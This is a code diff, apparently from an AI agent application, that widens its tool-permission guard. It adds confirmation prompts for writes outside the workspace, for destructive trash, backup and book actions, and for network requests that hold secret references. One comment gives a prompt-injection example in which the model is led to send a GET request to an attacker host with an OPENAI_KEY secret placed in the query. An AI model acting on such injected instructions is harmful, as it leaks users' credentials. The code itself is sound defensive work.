@@ -45,6 +45,9 @@ const GUARDED_TOOLS: Record<string, GuardSpec> = {
   searchFiles: { action: "fileRead", pathArg: "subdir", title: "搜索工作区外目录" },
   runCommand: { action: "command", pathArg: "", title: "执行命令" },
   httpRequest: { action: "network", pathArg: "", title: "发送网络请求" },
+  // 2026-10-22 审计补齐：解压/下载都会写盘，界外写入需确认（zip-slip 已在工具内拒绝）
+  extractZip: { action: "fileWrite", pathArg: "destDir", title: "解压 ZIP 到工作区外目录" },
+  downloadFile: { action: "fileWrite", pathArg: "savePath", title: "下载文件到工作区外路径" },
 };
 
 function cancelledResult() {
@@ -334,6 +337,42 @@ export function wrapToolsWithGuard(tools: Record<string, Tool>, agentScope: Agen
       continue;
     }
 
+    // 破坏性动作恒确认（2026-10-22 审计补齐）：回收站永久删除/恢复、备份恢复、删书
+    if (name === "trashManager" || name === "manageSync" || name === "manageBook") {
+      wrapped[name] = {
+        ...baseTool,
+        execute: async (args: any, options: any) => {
+          try {
+            const action = String(args?.action ?? "");
+            const critical =
+              (name === "trashManager" && (action === "purge" || action === "empty" || action === "restore")) ||
+              (name === "manageSync" && action === "restore") ||
+              (name === "manageBook" && action === "delete");
+            if (!critical) return await originalExecute(args, options);
+            const approved = await requestWithAbort(
+              {
+                toolName: name,
+                title:
+                  name === "trashManager"
+                    ? `回收站：${action === "purge" ? "永久删除" : action === "empty" ? "清空回收站" : "恢复条目"}`
+                    : name === "manageSync"
+                      ? "恢复备份（会整体替换当前数据库）"
+                      : "删除书籍",
+                detail: summarizeArgs(args, 500),
+                dontAskKey: `${name}:${action}:${crypto.randomUUID()}`,
+              },
+              options?.abortSignal as AbortSignal | undefined,
+            );
+            if (!approved) return cancelledResult();
+            return await originalExecute(args, options);
+          } catch (error) {
+            return guardFailedResult(error);
+          }
+        },
+      };
+      continue;
+    }
+
     if (!spec) {
       wrapped[name] = baseTool;
       continue;
@@ -382,9 +421,11 @@ export function wrapToolsWithGuard(tools: Record<string, Tool>, agentScope: Agen
             detail = String(args?.command ?? "");
             dontAskKey = `runCommand:${detail}`;
           } else {
-            // network：非 GET 全模式确认
+            // network：非 GET 全模式确认；GET 一般静默，但 URL/headers/body 里出现 {{secret:}} 时
+            // 属于密钥外发通道，必须确认（防提示注入让模型 GET attacker/?k={{secret:OPENAI_KEY}}）
             const method = String(args?.method ?? "GET").toUpperCase();
-            if (method === "GET") {
+            const hasSecretRef = /\{\{secret:[^}]+\}\}/.test(JSON.stringify(args ?? {}));
+            if (method === "GET" && !hasSecretRef) {
               return await originalExecute(baseArgs, options);
             }
             let host = "";
@@ -393,9 +434,9 @@ export function wrapToolsWithGuard(tools: Record<string, Tool>, agentScope: Agen
             } catch {
               host = "";
             }
-            title = `发送网络 ${method} 请求`;
-            detail = `${method} ${String(args?.url ?? "")}`;
-            dontAskKey = `httpRequest:${method}:${host}`;
+            title = hasSecretRef ? `发送含密钥引用的网络 ${method} 请求` : `发送网络 ${method} 请求`;
+            detail = `${method} ${String(args?.url ?? "")}${hasSecretRef ? "\n参数含 {{secret:...}} 引用（密钥会随请求外发）" : ""}`;
+            dontAskKey = hasSecretRef ? `httpRequest:secret:${crypto.randomUUID()}` : `httpRequest:${method}:${host}`;
           }
 
           const approved = await requestWithAbort(
